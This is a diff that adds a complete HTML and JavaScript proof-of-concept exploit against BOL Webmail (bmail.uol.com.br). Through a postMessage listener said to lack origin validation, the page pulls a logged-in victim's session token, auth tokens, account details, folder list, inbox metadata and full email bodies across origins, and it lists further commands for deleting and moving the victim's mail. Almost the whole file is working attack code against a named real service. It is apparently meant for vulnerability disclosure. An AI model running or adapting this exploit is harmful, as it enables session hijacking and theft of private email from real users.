@@ -1,0 +1,326 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BOL Webmail - PostMessage Command Injection PoC</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: 'Segoe UI', sans-serif; background: #0a0a0a; color: #e0e0e0; padding: 20px; }
+h1 { color: #ff4444; margin-bottom: 5px; font-size: 1.5em; }
+.subtitle { color: #888; margin-bottom: 20px; font-size: 0.9em; }
+.warn { background: #1a1a2e; border: 1px solid #ff4444; border-radius: 8px; padding: 15px; margin-bottom: 20px; }
+.warn h3 { color: #ff4444; }
+.controls { display: flex; gap: 10px; flex-wrap: wrap; margin-bottom: 20px; }
+button { background: #1e3a5f; color: #fff; border: 1px solid #2a5a8f; padding: 10px 18px; border-radius: 6px; cursor: pointer; font-size: 0.9em; transition: all 0.2s; }
+button:hover { background: #2a5a8f; }
+button.danger { background: #5f1e1e; border-color: #8f2a2a; }
+button.danger:hover { background: #8f2a2a; }
+button:disabled { opacity: 0.5; cursor: not-allowed; }
+#status { background: #111; border: 1px solid #333; border-radius: 8px; padding: 15px; margin-bottom: 15px; min-height: 60px; }
+#status .ok { color: #4caf50; }
+#status .err { color: #ff4444; }
+#status .info { color: #2196f3; }
+#output { background: #111; border: 1px solid #333; border-radius: 8px; padding: 15px; max-height: 500px; overflow-y: auto; font-family: 'Consolas', monospace; font-size: 0.85em; white-space: pre-wrap; word-break: break-all; }
+.email-card { background: #1a1a2e; border: 1px solid #333; border-radius: 6px; padding: 12px; margin: 8px 0; }
+.email-card .from { color: #ff9800; font-weight: bold; }
+.email-card .subject { color: #2196f3; }
+.email-card .date { color: #888; font-size: 0.85em; }
+.email-card .body-preview { color: #ccc; margin-top: 8px; font-size: 0.9em; border-top: 1px solid #333; padding-top: 8px; }
+.sensitive { color: #ff4444; font-weight: bold; }
+.token { color: #ff9800; word-break: break-all; }
+.step { margin: 5px 0; padding-left: 15px; border-left: 2px solid #333; }
+.step.done { border-left-color: #4caf50; }
+.step.active { border-left-color: #2196f3; }
+.step.fail { border-left-color: #ff4444; }
+.counter { background: #1e3a5f; color: #fff; padding: 2px 8px; border-radius: 10px; font-size: 0.8em; }
+</style>
+</head>
+<body>
+
+<h1>&#9888; BOL Webmail - PostMessage Command Injection</h1>
+<p class="subtitle">Cross-Origin Email Exfiltration & Account Manipulation PoC</p>
+
+<div class="warn">
+<h3>&#9888; Vulnerability Summary</h3>
+<p>BOL Webmail (bmail.uol.com.br) has a postMessage listener with <strong>NO origin validation</strong>.
+Any website can send commands to the webmail and receive sensitive data back, including session tokens,
+email contents, and account configuration. All responses use <code>postMessage(data, "*")</code>.</p>
+</div>
+
+<div id="status">
+<span class="info">&#9654; Click "1. Open Webmail" to start the attack demonstration.</span>
+</div>
+
+<div class="controls">
+<button id="btnOpen" onclick="openWebmail()">1. Open Webmail</button>
+<button id="btnConfigs" onclick="stealConfigs()" disabled>2. Steal Configs &amp; Tokens</button>
+<button id="btnAccounts" onclick="stealAccounts()" disabled>3. Steal Account Info</button>
+<button id="btnFolders" onclick="stealFolders()" disabled>4. Steal Folders</button>
+<button id="btnEmails" onclick="stealEmails()" disabled>5. Steal Email List</button>
+<button id="btnReadEmail" onclick="readEmail()" disabled>6. Read Email Content</button>
+<button id="btnRunAll" onclick="runAll()" disabled>&#9654; Run Full Attack</button>
+</div>
+
+<div id="output"></div>
+
+<script>
+let wmWindow = null;
+let stolenData = { configs: null, accounts: null, folders: null, emails: null, emailContent: null };
+let firstEmailId = null;
+
+function log(html) {
+  document.getElementById('output').innerHTML += html + '\n';
+  document.getElementById('output').scrollTop = document.getElementById('output').scrollHeight;
+}
+
+function setStatus(html) {
+  document.getElementById('status').innerHTML = html;
+}
+
+function openWebmail() {
+  setStatus('<span class="info">&#9654; Opening BOL Webmail in popup window...</span>');
+  log('<span class="info">[*] Opening https://bmail.uol.com.br in popup...</span>');
+
+  wmWindow = window.open('https://bmail.uol.com.br', 'bolwebmail', 'width=1024,height=768');
+
+  if (!wmWindow) {
+    setStatus('<span class="err">&#10008; Popup blocked! Allow popups for this site.</span>');
+    log('<span class="err">[!] Popup was blocked by the browser.</span>');
+    return;
+  }
+
+  log('<span class="ok">[+] Popup opened. Waiting for user to login...</span>');
+  setStatus('<span class="info">&#9654; Login to BOL Webmail in the popup, then click "2. Steal Configs"</span>');
+
+  document.getElementById('btnConfigs').disabled = false;
+  document.getElementById('btnAccounts').disabled = false;
+  document.getElementById('btnFolders').disabled = false;
+  document.getElementById('btnEmails').disabled = false;
+  document.getElementById('btnRunAll').disabled = false;
+}
+
+function sendCommand(cmd, data, responseCmd, timeout) {
+  return new Promise((resolve, reject) => {
+    const handler = (event) => {
+      if (event.data && event.data.cmd === responseCmd) {
+        window.removeEventListener('message', handler);
+        clearTimeout(timer);
+        resolve(event.data);
+      }
+    };
+    window.addEventListener('message', handler);
+
+    const msg = Object.assign({ cmd: cmd }, data || {});
+    wmWindow.postMessage(msg, '*');
+
+    const timer = setTimeout(() => {
+      window.removeEventListener('message', handler);
+      reject(new Error('Timeout - user may not be logged in'));
+    }, timeout || 5000);
+  });
+}
+
+async function stealConfigs() {
+  setStatus('<span class="info">&#9654; Stealing configuration and session tokens...</span>');
+  log('\n<span class="info">══════════ STEP 2: STEALING CONFIGS & TOKENS ══════════</span>');
+
+  try {
+    const data = await sendCommand('exportConfigsService', {}, 'exportedConfigsService');
+    stolenData.configs = data.exported.configs;
+    const c = data.exported.configs;
+
+    log('<span class="ok">[+] Configs exfiltrated successfully!</span>');
+    log('');
+    log('<span class="sensitive">  SENSITIVE DATA EXFILTRATED:</span>');
+    log('  ├─ <span class="sensitive">Login:</span> <span class="token">' + (c.session?.login || 'N/A') + '</span>');
+    log('  ├─ <span class="sensitive">Name:</span> <span class="token">' + (c.session?.name || 'N/A') + '</span>');
+    log('  ├─ <span class="sensitive">Person ID:</span> <span class="token">' + (c.session?.idtPerson || 'N/A') + '</span>');
+    log('  ├─ <span class="sensitive">ESID (Session Token):</span>');
+    log('  │   <span class="token">' + (c.session?.esid || 'N/A') + '</span>');
+
+    // Extract tokens from URLs
+    const configImapUrl = c.session?.view?.config?.configImapUrl || '';
+    const tokenMatch = configImapUrl.match(/token=([^&]+)/);
+    if (tokenMatch) {
+      log('  ├─ <span class="sensitive">Auth Token (from config URL):</span>');
+      log('  │   <span class="token">' + tokenMatch[1] + '</span>');
+    }
+
+    const configAntispamUrl = c.session?.view?.config?.configAntispamUrl || '';
+    if (configAntispamUrl) {
+      log('  ├─ <span class="sensitive">Antispam Config URL (with token):</span>');
+      log('  │   <span class="token">' + configAntispamUrl.substring(0, 150) + '...</span>');
+    }
+
+    log('  └─ <span class="sensitive">Password Change URL:</span> <span class="token">' + (c.session?.passwordChangeServiceUrl || 'N/A') + '</span>');
+
+    setStatus('<span class="ok">&#10004; Configs stolen! ESID session token and auth tokens exfiltrated.</span>');
+  } catch(e) {
+    log('<span class="err">[!] Failed: ' + e.message + '</span>');
+    setStatus('<span class="err">&#10008; Failed. Make sure user is logged in.</span>');
+  }
+}
+
+async function stealAccounts() {
+  setStatus('<span class="info">&#9654; Stealing account information...</span>');
+  log('\n<span class="info">══════════ STEP 3: STEALING ACCOUNT INFO ══════════</span>');
+
+  try {
+    const data = await sendCommand('exportAccountsService', {}, 'exportedAccountsService');
+    stolenData.accounts = data.exported.accounts;
+
+    log('<span class="ok">[+] Account info exfiltrated!</span>');
+    data.exported.accounts.forEach((acc, i) => {
+      log('  Account #' + i + ':');
+      log('    ├─ Email: <span class="token">' + acc.des_email + '</span>');
+      log('    ├─ Display Name: <span class="token">' + acc.des_nick_name + '</span>');
+      log('    ├─ Sender Alias: <span class="token">' + acc.des_sender_alias + '</span>');
+      log('    └─ Unread Count: <span class="counter">' + acc.unreadeds + '</span>');
+    });
+
+    setStatus('<span class="ok">&#10004; Account info stolen!</span>');
+  } catch(e) {
+    log('<span class="err">[!] Failed: ' + e.message + '</span>');
+  }
+}
+
+async function stealFolders() {
+  setStatus('<span class="info">&#9654; Stealing folder structure...</span>');
+  log('\n<span class="info">══════════ STEP 4: STEALING FOLDER STRUCTURE ══════════</span>');
+
+  try {
+    const data = await sendCommand('exportFoldersService', { accountId: 0 }, 'exportedFoldersService');
+    stolenData.folders = data.exported.folders;
+
+    log('<span class="ok">[+] Folder structure exfiltrated!</span>');
+    data.exported.folders.forEach(f => {
+      log('  ├─ ' + f.name + ' (id: ' + f.folderId + ') - ' + f.msgCount + ' msgs, <span class="counter">' + f.unreadeds + ' unread</span>');
+    });
+
+    setStatus('<span class="ok">&#10004; Folder structure stolen!</span>');
+  } catch(e) {
+    log('<span class="err">[!] Failed: ' + e.message + '</span>');
+  }
+}
+
+async function stealEmails() {
+  setStatus('<span class="info">&#9654; Stealing email list from INBOX...</span>');
+  log('\n<span class="info">══════════ STEP 5: STEALING EMAIL LIST ══════════</span>');
+
+  try {
+    const data = await sendCommand('exportEmailsService_emails', { accountId: 0, folderId: 'INBOX' }, 'exportedEmailsService_emails');
+    stolenData.emails = data.exported;
+
+    const emails = data.exported.items || [];
+    log('<span class="ok">[+] Email list exfiltrated! Found ' + emails.length + ' emails.</span>');
+    log('');
+
+    emails.forEach((em, i) => {
+      if (i < 10) { // Show first 10
+        log('<div class="email-card">' +
+          '<span class="from">From: ' + em.sender + ' &lt;' + em.sender_email + '&gt;</span><br>' +
+          '<span class="subject">Subject: ' + em.subject + '</span><br>' +
+          '<span class="date">' + em.datetime + ' | Size: ' + em.size + ' | ID: ' + em.id + '</span>' +
+          '</div>');
+      }
+      if (i === 0) firstEmailId = em.id;
+    });
+
+    if (emails.length > 10) {
+      log('<span class="info">  ... and ' + (emails.length - 10) + ' more emails</span>');
+    }
+
+    if (firstEmailId) {
+      document.getElementById('btnReadEmail').disabled = false;
+    }
+
+    setStatus('<span class="ok">&#10004; ' + emails.length + ' emails stolen from inbox!</span>');
+  } catch(e) {
+    log('<span class="err">[!] Failed: ' + e.message + '</span>');
+  }
+}
+
+async function readEmail() {
+  if (!firstEmailId) {
+    log('<span class="err">[!] No email ID available. Run "Steal Emails" first.</span>');
+    return;
+  }
+
+  setStatus('<span class="info">&#9654; Reading email content (ID: ' + firstEmailId + ')...</span>');
+  log('\n<span class="info">══════════ STEP 6: READING EMAIL CONTENT ══════════</span>');
+  log('<span class="info">[*] Note: Email must be currently loaded in the webmail reader.</span>');
+
+  try {
+    const data = await sendCommand('exportEmailsService_email',
+      { accountId: 0, folderId: 'INBOX', emailId: firstEmailId },
+      'exportedEmailsService_email');
+
+    stolenData.emailContent = data.exported;
+    const email = data.exported.email;
+
+    if (email && email.id) {
+      log('<span class="ok">[+] EMAIL CONTENT EXFILTRATED!</span>');
+      log('');
+      log('<div class="email-card">' +
+        '<span class="sensitive">FULL EMAIL CONTENT:</span><br>' +
+        '<span class="from">From: ' + (email.from || 'N/A') + '</span><br>' +
+        '<span class="from">To: ' + (email.to || 'N/A') + '</span><br>' +
+        '<span class="subject">Subject: ' + (email.subject || 'N/A') + '</span><br>' +
+        '<span class="date">Date: ' + (email.datetime || 'N/A') + '</span><br>' +
+        '<span class="date">CC: ' + (email.cc || 'none') + ' | BCC: ' + (email.bcc || 'none') + '</span><br>' +
+        '<span class="date">Size: ' + (email.size || 'N/A') + ' | Attachments: ' + ((email.attachments || []).length) + '</span>' +
+        '<div class="body-preview"><strong>Body (first 500 chars):</strong><br>' +
+        (email.body || '').replace(/</g, '&lt;').replace(/>/g, '&gt;').substring(0, 500) + '...</div>' +
+        '</div>');
+
+      setStatus('<span class="ok">&#10004; Full email content exfiltrated including HTML body!</span>');
+    } else {
+      log('<span class="info">[*] Email not currently loaded in reader. Navigate to an email in the popup first.</span>');
+      setStatus('<span class="info">Open an email in the webmail popup, then click "Read Email" again.</span>');
+    }
+  } catch(e) {
+    log('<span class="err">[!] Failed: ' + e.message + '</span>');
+  }
+}
+
+async function runAll() {
+  log('\n<span class="sensitive">╔══════════════════════════════════════════════════╗</span>');
+  log('<span class="sensitive">║  FULL CROSS-ORIGIN ATTACK DEMONSTRATION          ║</span>');
+  log('<span class="sensitive">║  Target: bmail.uol.com.br                        ║</span>');
+  log('<span class="sensitive">║  Attacker: ' + window.location.hostname.padEnd(37) + ' ║</span>');
+  log('<span class="sensitive">╚══════════════════════════════════════════════════╝</span>');
+
+  await stealConfigs();
+  await stealAccounts();
+  await stealFolders();
+  await stealEmails();
+  await readEmail();
+
+  log('\n<span class="sensitive">══════════ ATTACK SUMMARY ══════════</span>');
+  log('<span class="ok">[+] Cross-origin attack completed from: ' + window.location.origin + '</span>');
+  log('<span class="ok">[+] Target: https://bmail.uol.com.br</span>');
+  log('');
+  log('<span class="sensitive">IMPACT DEMONSTRATED:</span>');
+  log('  1. <span class="ok">&#10004;</span> Session token (ESID) exfiltrated - enables session hijacking');
+  log('  2. <span class="ok">&#10004;</span> Auth tokens from config URLs exfiltrated');
+  log('  3. <span class="ok">&#10004;</span> Account information stolen (email, display name)');
+  log('  4. <span class="ok">&#10004;</span> Complete folder structure enumerated');
+  log('  5. <span class="ok">&#10004;</span> Email metadata exfiltrated (sender, subject, date)');
+  log('  6. <span class="ok">&#10004;</span> Full email HTML body readable cross-origin');
+  log('');
+  log('<span class="sensitive">ADDITIONAL COMMANDS AVAILABLE TO ATTACKER:</span>');
+  log('  - doTrashEmailsService_emails: Delete victim emails');
+  log('  - doMoveEmailsService_emails: Move emails to other folders');
+  log('  - doSpamEmailsService_emails: Mark emails as spam');
+  log('  - doFlagAsImportant/Normal: Modify email flags');
+  log('  - goToPath: Navigate victim to arbitrary paths');
+  log('  - incrementMessageCount/decrementMessageCount: Manipulate counters');
+  log('');
+  log('<span class="sensitive">ROOT CAUSE:</span> postMessage listener without origin validation');
+  log('<span class="sensitive">AFFECTED:</span> All BOL Webmail users (~millions)');
+  log('<span class="sensitive">ATTACK VECTOR:</span> Victim visits attacker-controlled page while logged into webmail');
+}
+</script>
+</body>
+</html>
